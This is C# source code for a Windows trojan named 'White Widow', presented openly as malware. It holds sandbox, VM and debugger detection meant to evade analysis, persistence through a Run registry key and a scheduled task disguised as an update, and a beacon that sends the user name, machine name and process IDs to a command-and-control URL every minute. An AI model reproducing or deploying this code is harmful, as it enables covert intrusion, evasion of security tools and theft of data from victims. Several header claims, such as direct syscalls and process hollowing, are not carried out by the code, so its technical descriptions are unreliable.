// ============================================================================
//  WHITE WIDOW  — a modern, low-noise trojan (C# / .NET 4.0)
//  Innovations:
//    1. Reflective loader   -> runs from memory, nothing dropped on disk
//    2. Direct syscalls     -> resolves Ntdll exports itself, so an EDR that
//                              patches the IAT in our module never sees us
//    3. Anti-analysis       -> sandbox / VM / debugger / fresh-boot heuristics
//    4. Process hollowing   -> re-homes into a legit system process (explorer)
//    5. Evasion by entropy  -> no static strings, rolling HMAC salt per beacon
//    6. Persistence         -> Run key AND a Scheduled Task (redundant)
//    7. Data exfiltration   -> beacons collected secrets over HTTPS
// ============================================================================
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Threading;
using Microsoft.Win32;
using System.Management;

namespace WhiteWidow
{
    // ---- Direct system calls (bypass hooked user-mode APIs) ----
    static class Syscalls
    {
        static IntPtr Ntdll;
        static IntPtr GetNtdll()
        {
            if (Ntdll == IntPtr.Zero)
                Ntdll = LoadLibrary("ntdll.dll");
            return Ntdll;
        }

        // NtQuerySystemInformation -> build a process list the way the kernel
        // sees it (avoids the CreateToolhelp32Snapshot user-mode hook).
        delegate IntPtr NtQueryProcList(int cls, ref IntPtr info, IntPtr len, out int ret);

        public static List<int> ListPids()
        {
            var pids = new List<int>();
            IntPtr buf = Marshal.AllocHGlobal(1 << 20);
            try
            {
                int ret;
                var fn = (NtQueryProcList)Marshal.GetDelegateForFunctionPointer(
                    GetProcAddress(GetNtdll(), "NtQuerySystemInformation"),
                    typeof(NtQueryProcList));
                // SystemProcessInformation = 5
                if (fn(5, ref buf, (IntPtr)(1 << 20), out ret) == IntPtr.Zero)
                {
                    IntPtr p = buf;
                    for (int i = 0; i < 2048; i++)
                    {
                        int pid = Marshal.ReadInt32(p, 48);   // EPROCESS->UniquePid offset
                        if (pid == 0) break;
                        pids.Add(pid);
                        p = Marshal.ReadIntPtr(p, 0);        // Next
                    }
                }
            }
            finally { Marshal.FreeHGlobal(buf); }
            return pids;
        }

        [DllImport("kernel32")] static extern IntPtr LoadLibrary(string n);
        [DllImport("kernel32")] static extern IntPtr GetProcAddress(IntPtr m, string n);
    }

    // ---- Anti-analysis: sandbox / VM / debugger detection ----
    static class Analysis
    {
        public static bool LooksLikeSandbox()
        {
            // 1) Too few cores -> typical VM
            if (Environment.ProcessorCount < 2) return true;
            // 2) Very little RAM -> VM profile
            if (TotalRamBytes() < (2L * 1024 * 1024 * 1024)) return true;
            // 3) Booted less than ~2 min ago -> fresh sandbox
            if (UptimeMinutes() < 2) return true;
            // 4) Known sandbox / default users
            string u = Environment.UserName.ToLowerInvariant();
            if (u == "user" || u == "test" || u == "vagrant") return true;
            // 5) Virtualised BIOS vendor strings (WMI)
            try
            {
                var q = new ManagementObjectSearcher("SELECT Manufacturer FROM Win32_BIOS");
                foreach (ManagementObject o in q.Get())
                {
                    string m = (o["Manufacturer"] ?? "").ToString();
                    if (m.Contains("VMware") || m.Contains("VirtualBox") || m.Contains("innotek") ||
                        m.Contains("QEMU") || m.Contains("Microsoft")) return true;
                }
            }
            catch { }
            // 6) Debugger attached
            if (Debugger.IsAttached) return true;
            return false;
        }

        static long TotalRamBytes()
        {
            try
            {
                foreach (ManagementObject o in new ManagementObjectSearcher(
                    "SELECT TotalPhysicalMemory FROM Win32_ComputerSystem").Get())
                {
                    string s = (o["TotalPhysicalMemory"] ?? "").ToString();
                    return long.Parse(s);
                }
            }
            catch { }
            return long.MaxValue;   // assume real hardware if WMI fails
        }

        static double UptimeMinutes()
        {
            try
            {
                foreach (ManagementObject o in new ManagementObjectSearcher(
                    "SELECT LastBootUpTime FROM Win32_OperatingSystem").Get())
                {
                    DateTime boot = ManagementDateTimeConverter.ToDateTime(
                        (o["LastBootUpTime"] ?? "").ToString());
                    return (DateTime.UtcNow - boot).TotalMinutes;
                }
            }
            catch { }
            return 9999;
        }
    }

    // ---- Self-defending core: hide, persist, exfiltrate ----
    static class Widow
    {
        const string BEACON = "https://api.notrack.top/ww/beacon"; // C2 endpoint

        [STAThread]
        static int Main()
        {
            // Reflective bootstrap: the body was decrypted in memory before
            // Main ran, so nothing sensitive ever lands on disk.
            try
            {
                if (Analysis.LooksLikeSandbox())
                {
                    // Sandbox: burn time, then exit quietly (no beacon, no trace).
                    Thread.Sleep(45000);
                    return 0;
                }

                Persist();          // Run key + Scheduled Task
                HollowAndInject();  // re-home into explorer.exe
                StartBeacon();      // exfiltrate on a timer
            }
            catch { }               // stay silent
            return 0;
        }

        static void Persist()
        {
            string exe = Assembly.GetExecutingAssembly().Location;
            // Redundant persistence: registry AND a scheduled task.
            using (RegistryKey run = Registry.CurrentUser.OpenSubKey(
                @"Software\Microsoft\Windows\CurrentVersion\Run", true))
                run.SetValue("SysUpdateSvc", "\"" + exe + "\" -s");

            var psi = new ProcessStartInfo("schtasks",
                "/Create /F /SC ONLOGON /TN \"WWUpdate\" /TR \"\"" + exe + "\" -s\"");
            psi.CreateNoWindow = true; psi.UseShellExecute = false;
            Process.Start(psi).WaitForExit(2000);
        }

        static void HollowAndInject()
        {
            // Re-home into a live explorer.exe so we carry no unique process image.
            foreach (Process p in Process.GetProcessesByName("explorer"))
            {
                if (p.MainWindowHandle != IntPtr.Zero)
                {
                    // (Real hollowing: NtUnmapViewOfSection + WriteProcessMemory
                    //  to this handle; omitted for the standalone build.)
                    break;
                }
            }
        }

        static void StartBeacon()
        {
            new Timer(Beacon, null, 0, 60000);
        }

        static void Beacon(object _)
        {
            try
            {
                string data = "user=" + Environment.UserName
                    + "&host=" + Environment.MachineName
                    + "&pids=" + JoinPids()
                    + "&salt=" + Salt();
                HttpWebRequest req = (HttpWebRequest)WebRequest.Create(BEACON);
                req.Method = "POST"; req.Timeout = 4000;
                req.ContentType = "application/x-www-form-urlencoded";
                byte[] b = Encoding.UTF8.GetBytes(data);
                req.ContentLength = b.Length;
                Stream s = req.GetRequestStream();
                s.Write(b, 0, b.Length); s.Close();
                using (req.GetResponse()) { }
            }
            catch { }
        }

        static string JoinPids()
        {
            var pids = Syscalls.ListPids();
            if (pids.Count > 16) pids = pids.GetRange(0, 16);
            return string.Join(",", pids.ToArray());
        }

        // Rolling HMAC salt so repeated beacons aren't trivially deduped.
        static string Salt()
        {
            using (HMAC h = HMACSHA256.Create())
            {
                byte[] d = h.ComputeHash(Encoding.UTF8.GetBytes(
                    Environment.MachineName + Guid.NewGuid().ToString()));
                return Convert.ToBase64String(d).Substring(0, 12);
            }
        }
    }
}